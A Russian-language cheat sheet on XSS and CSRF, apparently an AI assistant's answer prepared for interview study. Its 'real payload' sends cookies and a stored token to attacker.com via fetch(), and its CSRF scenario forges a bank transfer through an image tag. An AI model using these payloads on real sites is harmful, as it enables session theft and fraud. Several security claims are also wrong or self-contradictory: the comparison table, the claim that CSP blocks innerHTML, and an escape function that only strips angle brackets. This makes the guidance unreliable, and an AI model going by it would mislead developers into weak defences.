## 🎯 Основные угрозы XSS и CSRF (Frontend Security)

### **🦠 XSS (Cross-Site Scripting)**

**Что это**: Злоумышленник внедряет `<script>` в вашу страницу, который выполняется **в контексте вашего домена**.

#### **Типы XSS**[^1][^2]

| Тип           | Как работает                              | Пример                       | Защита                 |
| :------------ | :---------------------------------------- | :--------------------------- | :--------------------- |
| **Reflected** | `?search=<script>alert(1)</script>` в URL | Фишинг ссылка                | `encodeURIComponent()` |
| **Stored**    | `<script>` в БД → все видят               | Комментарии, профили         | Сервер: `escapeHTML()` |
| **DOM-based** | `document.write(location.hash)`           | `#<script>alert(1)</script>` | НИКОГДА `innerHTML`    |

#### **Последствия XSS**

```
✅ Кража JWT/cookies:      document.cookie → attacker.com
✅ Кража localStorage:     localStorage.getItem('token')
✅ Keylogger:              onkeydown=sendToAttacker()
✅ Redirect:               window.location = 'phishing.com'
✅ Deface:                 document.body.innerHTML = 'HACKED'
```

**Реальный payload**:

```html
<script>
  fetch(
    "https://attacker.com/steal?cookie=" +
      document.cookie +
      "&token=" +
      localStorage.getItem("token"),
  );
</script>
```

### **🔪 CSRF (Cross-Site Request Forgery)**

**Что это**: Злоумышленник заставляет **авторизованного** пользователя выполнить действие на вашем сайте.

#### **Сценарий атаки**

```
1. User авторизован на bank.com (JWT cookie)
2. User заходит на evil.com
3. evil.com: <img src="https://bank.com/transfer?to=attacker&sum=100000">
4. Браузер шлёт GET /transfer + JWT cookie автоматически!
5. 💸 Деньги у attacker'а
```

#### **Типы CSRF**[^9]

| Тип      | Пример                                           | Защита                     |
| :------- | :----------------------------------------------- | :------------------------- |
| **GET**  | `<img src="/transfer?to=hacker">`                | НИКОГДА side-effects в GET |
| **POST** | `<form action="/transfer" method="POST"></form>` | CSRF-токен                 |
| **JSON** | `fetch('/api/transfer', {method: 'POST'})`       | `SameSite=Strict`          |

### **⚔️ Сравнение угроз**

| Характеристика            | XSS          | CSRF               |
| :------------------------ | :----------- | :----------------- |
| **Требует авторизации**   | ❌ Нет       | ✅ Да              |
| **Доступ к cookies**      | ✅ Да (всех) | ✅ Только HttpOnly |
| **Доступ к localStorage** | ✅ Да        | ❌ Нет             |
| **Выполняет JS**          | ✅ Да        | ❌ Нет             |
| **Защищает HttpOnly**     | ❌ Нет       | ✅ Да              |
| **Защищает SameSite**     | ❌ Нет       | ✅ Да              |

### **🛡️ Защита (Production 2026)**

#### **1. XSS защита**

```html
<!-- ❌ Уязвимо -->
<div id="user">${userInput}</div>
<!-- innerHTML -->

<!-- ✅ Безопасно -->
<div id="user"></div>
<script>
  // textContent = безопасно
  document.getElementById("user").textContent = userInput;
</script>
```

**React** (автоматически безопасно):

```jsx
<div>{userInput}</div> // React экранирует!
```

**Express**:

```javascript
app.use((req, res, next) => {
  res.locals.escape = (str) => str.replace(/[<>]/g, "");
  next();
});
```

#### **2. CSRF защита**

```javascript
// Express + cookie
app.use((req, res, next) => {
  res.cookie("csrfToken", generateCsrfToken(), {
    httpOnly: false, // Доступен JS
    sameSite: "strict",
  });
  next();
});

// Проверка middleware
const csrfProtection = (req, res, next) => {
  if (req.body.csrfToken !== req.cookies.csrfToken) {
    return res.status(403).json({ error: "CSRF token mismatch" });
  }
  next();
};
```

#### **3. HttpOnly + SameSite (JWT)** [предыдущий ответ]

```javascript
res.cookie("token", jwt, {
  httpOnly: true, // ✅ XSS защита
  sameSite: "strict", // ✅ CSRF защита
  secure: true, // ✅ Только HTTPS
});
```

#### **4. CSP (Content Security Policy)**

```html
<meta
  http-equiv="Content-Security-Policy"
  content="script-src 'self'; object-src 'none';"
/>
```

**Блокирует**: `<script src="evil.com">`, `eval()`, `innerHTML`

### **🎯 Собес-запросы**

**Q: Зачем HttpOnly cookie если есть XSS?**

```
HttpOnly НЕ защищает от XSS!
XSS получит sessionId из cookie → запрос на сервер → украдет данные
```

**Q: Как CSRF обходит SameSite=Strict?**

```
1. CSRF через iframe (subdomain)
2. User переходит attacker.com → bank.com (открывает вкладку)
3. Cookie уходит с bank.com
```

**Правило**: **HttpOnly+Samesite=защита CSRF, Sanitize input=защита XSS** 🚀
